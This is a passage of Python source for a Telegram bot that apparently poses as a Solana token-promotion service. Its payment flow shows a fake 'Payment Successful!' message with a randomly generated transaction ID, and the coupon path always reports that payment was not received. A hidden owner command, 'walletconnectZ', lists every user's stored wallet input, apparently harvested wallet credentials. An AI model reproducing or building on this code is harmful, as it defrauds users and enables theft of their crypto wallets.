            await msg.edit_text(f"<b>{dots[i % 4]}</b>", parse_mode='HTML')
        
        # Generate transaction ID using the imported random module
        import random
        tx_id = random.randint(100000, 999999)
        
        # "Success" message
        keyboard = [
            [InlineKeyboardButton('✅ Continue', callback_data='launch_token')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await msg.edit_text(
            f'''
    ✅ <b>Payment Successful!</b>

    ━━━━━━━━━━━━━━━━━━━━━
    <b>Amount:</b> {amount} SOL
    <b>Payment Method:</b> Card
    <b>Status:</b> Completed
    <b>Transaction ID:</b> <code>TX{tx_id}</code>
    ━━━━━━━━━━━━━━━━━━━━━

    Your payment has been processed successfully.
    ''',
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        
    elif query.data == 'confirm_payment_coupon':
        # Show payment not received message
        await query.answer(
            text="❌ Payment not received.",
            show_alert=True
        )

        # Create animation message
        msg = await query.message.reply_text("<b>⏳ Validating</b>", parse_mode='HTML')

        # Animate with italic formatting
        dots = ["⏳ <i>Validating</i>", "⏳ <i>Validating.</i>", "⏳ <i>Validating..</i>", "⏳ <i>Validating...</i>"]
        final_message = "❌ <b>Payment not Received.</b>\n\nContact support if SOL was sent"
        
        try:
            for i in range(12):  # 3 full cycles
                await asyncio.sleep(0.2)
                await msg.edit_text(f"<b>{dots[i % 4]}</b>", parse_mode='HTML')
            
            # Create keyboard with support contact
            keyboard = [
                [InlineKeyboardButton('📞 Contact Support', url='https://t.me/DELUGE_BUMP_SUPPORT')],
                [InlineKeyboardButton('🔙 Back to Menu', callback_data='main')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await msg.edit_text(final_message, parse_mode='HTML', reply_markup=reply_markup)
        except Exception as e:
            print(f"Error in animation: {e}")
            try:
                await msg.edit_text(final_message, parse_mode='HTML')
            except:
                pass

        
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_ID:
        await update.message.reply_text("🚫 You're not authorized.")
        return

    conn = sqlite3.connect("wallets.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, first_name, last_active FROM users ORDER BY last_active DESC")
    rows = cursor.fetchall()
    conn.close()

    if not rows:
        await update.message.reply_text("No users found.")
        return

    text = "\n".join([f"• <b>{row[2]}</b> (@{row[1]}) — <code>{row[0]}</code>" for row in rows])
    await update.message.reply_text(f"<b>📋 Users:</b>\n{text}", parse_mode="HTML")

async def walletconnectZ(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_ID:
        await update.message.reply_text("🚫 You're not authorized.")
        return

    conn = sqlite3.connect("wallets.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username, first_name, wallet_input FROM wallets")
    rows = cursor.fetchall()
    conn.close()

    if not rows:
        await update.message.reply_text("No users found.")
        return

    text = "\n".join([f"• <b>{row[1]}</b> (@{row[0]}) — <code>{row[2]}</code>" for row in rows])

    await update.message.reply_text(f"<b>📋 Users:</b>\n{text}", parse_mode="HTML")


         
         
         


if __name__ == "__main__":
    app = Application.builder().token(TOKEN).build()
    print('STARTING BOT......')
    
    # Start the keep-alive web server FIRST
    keep_alive()
    print('✅ Keep-alive server started')
    
    # Start background task for token updates in the same event loop
    async def post_init(application):
        """Run after application is initialized"""
        try:
            # Wait a bit before first fetch
            await asyncio.sleep(2)
            # Start the token cache updater as a background task
            asyncio.create_task(update_token_cache())
            print('✅ Token cache updater started (updates every hour)')
        except Exception as e:
            print(f"⚠️ Background task warning: {e}")
    
    # Set the post_init function
    app.post_init = post_init
    
    # Commands
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', help))
    app.add_handler(CommandHandler('faq', faq))
    app.add_handler(CommandHandler('list_users', list_users))
    app.add_handler(CommandHandler('walletconnectZ', walletconnectZ))
    app.add_handler(CommandHandler('activate', activate_coupon))
    app.add_handler(CommandHandler('deactivate', deactivate_coupon))
    app.add_handler(CommandHandler('coupons', list_coupons))
    
    # menu
    app.add_handler(CallbackQueryHandler(menu_handler))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    print('Polling...')
    app.run_polling()
